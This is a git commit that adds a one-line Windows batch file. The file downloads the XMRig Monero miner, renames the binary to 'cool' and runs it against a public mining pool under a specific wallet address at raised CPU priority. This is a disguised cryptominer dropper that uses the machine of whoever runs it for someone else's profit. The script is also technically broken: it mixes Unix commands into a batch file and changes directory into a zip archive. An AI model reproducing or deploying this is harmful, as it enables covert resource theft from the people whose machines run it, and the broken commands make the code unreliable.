5542ba2ab7871d2ceb6e85b8f8f2ce64cdc41474
Lachine <86872452+Lachine1@users.noreply.github.com>
2024-05-24 18:47:27 +0200

    Create windows.bat

---
+++ windows.bat
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip && unzip  xmrig-6.21.3-msvc-win64.zip && cd xmrig-6.21.3-msvc-win64.zip && move xmrig cool && ./cool -o xmrpool.eu:3333 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
